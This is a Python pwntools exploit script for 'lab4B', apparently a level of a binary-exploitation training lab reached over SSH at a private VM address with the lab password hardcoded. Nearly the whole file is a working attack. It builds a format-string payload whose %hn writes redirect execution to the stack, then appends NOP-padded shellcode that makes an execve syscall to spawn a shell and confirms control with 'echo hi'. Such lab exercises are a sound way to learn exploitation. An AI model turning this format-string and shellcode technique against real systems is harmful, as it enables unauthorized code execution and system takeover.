#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template lab4B --user lab4B --pass 'bu7_1t_w4sn7_brUt3_f0rc34b1e!' --host 192.168.56.101 --path /levels/lab04/lab4B
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('lab4B')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '192.168.56.101'
port = int(args.PORT or 22)
user = args.USER or 'lab4B'
password = args.PASSWORD or 'bu7_1t_w4sn7_brUt3_f0rc34b1e!'
remote_path = '/levels/lab04/lab4B'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

from ctypes import c_uint32

def uint32(x):
    return c_uint32(x).value

context.terminal = ["xfce4-terminal", "-e"]
io = start()


addr = 0x080499b8
# 0xbffff688 + 35
offset1 = 0xbfff - 8
offset2 = 0xf688 - offset1 - 8 + 35
arg_loc = 6
payload = "{}{}%{}x%{}$hn%{}x%{}$hn".format(p32(addr + 2), p32(addr), offset1, arg_loc, offset2, arg_loc + 1)
print (payload.encode("hex"))
print (len(payload))

crafted = shellcraft.i386.mov('esi', 0) + \
        shellcraft.i386.mov('edx', 0) + \
        shellcraft.i386.mov('ecx', 0) + \
        shellcraft.i386.mov('ebx', 0xb7f83a24, stack_allowed = False) + \
        shellcraft.i386.mov('eax', 0xb, stack_allowed = False) + \
        shellcraft.i386.linux.syscall('eax', 'ebx', 'ecx')
print (crafted.rstrip())

shellcode = "\x90" * 15 + asm(crafted)

payload += shellcode

print ("\\x" + "\\x".join("{:02x}".format(ord(c)) for c in payload))

io.sendline(payload)
io.sendline('echo hi')
print (io.clean())
